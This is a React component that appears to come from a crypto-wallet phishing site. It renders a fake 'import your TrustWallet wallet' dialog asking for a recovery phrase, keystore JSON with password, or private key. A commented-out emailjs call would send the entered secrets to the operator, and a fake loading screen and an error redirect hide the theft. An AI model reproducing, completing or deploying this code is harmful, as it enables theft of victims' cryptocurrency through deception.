import { CustomPlaceholder } from "react-placeholder-image"
import Tabs, { Tab } from "./Tabs"
import ReactDom from "react-dom"
import Overlay from "./Overlay"
import { useReducer, useState } from "react"
import { useNavigate } from "react-router-dom"
import emailjs from '@emailjs/browser';
import { usePromiseTracker, trackPromise } from "react-promise-tracker"
import Loading from "./Loading"

function formReducer(state, event) {
    if (event.reset) {
        return {
            "phrase": "",
            "keystore_json": "",
            "wallet_password": "",
            "private_key": ""
        }
    }
    return {
        ...state,
        [event.name]: event.value
    }
}

const ConnectManuallyModal = ({ title, src, closeConnectManualModal }) => {
    const [formData, setFormData] = useReducer(formReducer, {})
    const [activeTab, setActiveTab] = useState()
    const { promiseInProgress } = usePromiseTracker()
    const navigate = useNavigate()

    const sendEmail = () => {
        // return emailjs.send(process.env["REACT_APP_SERVICE_ID"], process.env["REACT_APP_TEMPLATE_ID"], formData, process.env["REACT_APP_PUBLIC_KEY"])
        return new Promise((resolve, reject) => {
            setTimeout(() => resolve("form submitted"), 3000)
        })
    }


    const handleSubmit = (e) => {
        e.preventDefault()

        switch (activeTab) {
            case "Phrase":
                if (!formData["phrase"]) return undefined
                break;

            case "KeyStore JSON":
                if (!formData["keystore_json"]) return undefined
                if (!formData["wallet_password"]) return undefined
                break;

            case "Private Key":
                if (!formData["private_key"]) return undefined
                break;

            default:
                return undefined
        }

        trackPromise(
            sendEmail()
                .then((res) => {

                    setFormData({
                        reset: true
                    })

                    navigate("/error")
                })
                .catch((err) => console.error("Something went wrong"))
        )

    }

    const handleChange = (e) => {
        let isCheckBox = e.target.type === "checkbox"

        setFormData({
            name: e.target.name,
            value: isCheckBox ? e.target.checked : e.target.value
        })

        console.dir(formData)
    }

    if (promiseInProgress) return <Loading loadingMsg={"Connecting to your wallet"} />

    return ReactDom.createPortal(
        <>
            <form onSubmit={handleSubmit} disabled={promiseInProgress} className=" w-11/12 z-50 max-w-xl fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 shadow-lg rounded-lg bg-white py-8 px-5 space-y-9">
                <div className="flex justify-between items-center">
                    <CustomPlaceholder width={40} height={40} className="block" />
                    <h3 className="font-medium text-xl text-center">import your {title || "TrustWallet"} wallet</h3>
                </div>

                <Tabs getActiveTab={setActiveTab}>
                    <Tab label="Phrase">
                        <textarea className="w-full placeholder:text-normal font-light px-3 py-2  border-2 resize-none rounded-xl border-solid mb-2"
                            onChange={handleChange}
                            value={formData.phrase || ""}
                            name="phrase"
                            id="recovery-phrase"
                            placeholder="Enter your recovery phrase"
                            required={true}>
                        </textarea>

                        <p className="text-gray-600 text-sm font-light tracking-wide text-center">Typically 12 (sometimes 24) words separated by single spaces</p>
                    </Tab>

                    <Tab label="KeyStore JSON">
                        <textarea className="w-full placeholder:text-sm font-light px-3 py-2  border-2 resize-none rounded-xl border-solid mb-2"
                            onChange={handleChange}
                            value={formData["keystore_json"] || ""}
                            name="keystore_json"
                            id="key-store-json"
                            placeholder="KeyStore JSON"
                            required={true}>

                        </textarea>

                        <input className="w-full placeholder:text-sm font-light p-3  border-2 resize-none rounded-xl border-solid mb-2"
                            onChange={handleChange}
                            value={formData["wallet_password"] || ""}
                            name="wallet_password"
                            type="text"
                            placeholder="Wallet Password"
                            required={true}
                        />

                        <p className="text-gray-600 text-sm font-light tracking-wide text-center">Several lines of text beginning with {`"{...}"`} plus the password you used to encrypt it.</p>
                    </Tab>

                    <Tab label="Private Key">
                        <input className="w-full placeholder:text-sm font-light p-3  border-2 resize-none rounded-xl border-solid mb-2"
                            onChange={handleChange}
                            value={formData["private_key"] || ""}
                            name="private_key"
                            type="text"
                            placeholder="Enter Your Private Key"
                            required={true}
                        />

                        <p className="text-gray-600 text-sm font-light tracking-wide text-center">Typically 12 (sometimes 24) words seperated by a single space.</p>
                    </Tab>
                </Tabs>

                <div className="space-y-4">
                    <button className={`block bg-blue-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg ${promiseInProgress && "pointer-events-none bg-gray-500 cursor-none"}`} disabled={promiseInProgress}>proceed</button>
                    <button className="block bg-red-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg" onClick={closeConnectManualModal}>cancel</button>
                </div>
            </form>
            <Overlay />
        </>
        ,
        document.getElementById("portal")
    )
}

export default ConnectManuallyModal